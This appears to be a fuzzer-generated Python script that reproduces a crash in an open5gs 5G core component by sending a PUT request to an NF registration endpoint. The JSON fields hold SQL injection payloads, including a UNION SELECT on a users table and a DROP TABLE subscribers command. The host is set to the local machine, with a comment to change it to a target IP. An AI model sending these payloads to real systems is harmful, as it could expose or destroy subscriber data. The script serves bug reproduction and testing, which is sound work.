#!/usr/bin/env python3
# Crash reproduction for open5gs-ausf (low)
# Detected: Sat May  9 07:22:37 2026
import http.client, json

host, port = '127.0.0.1', 80  # Update to target IP
method = 'PUT'
path = '/nnrf-nfm/v1/nf-instances/PCF-fuzz-8516'
body = b'{"nfInstanceId": "\' OR \'1\'=\'1", "nfType": "1\' UNION SELECT * FROM users--", "nfStatus": "\'; DROP TABLE subscribers; --", "ipv4Addresses": ["172.23.0.20"], "fqdn": "1\' UNION SELECT * FROM users--", "priority": 1, "capacity": 200, "load": 50, "nfServices": [{"serviceInstanceId": "namf-comm-001", "serviceName": "namf-comm", "versions": [{"apiVersionInUri": "v1", "apiFullVersion": "1.0.0"}], "scheme": "http", "nfServiceStatus": "REGISTERED", "ipEndPoints": [{"ipv4Address": "172.23.0.20", "port": 7777}]}], "supi": "1\' UNION SELECT * FROM users--"}'
conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f'Status: {resp.status}')
print(f'Body: {resp.read()[:500]}')
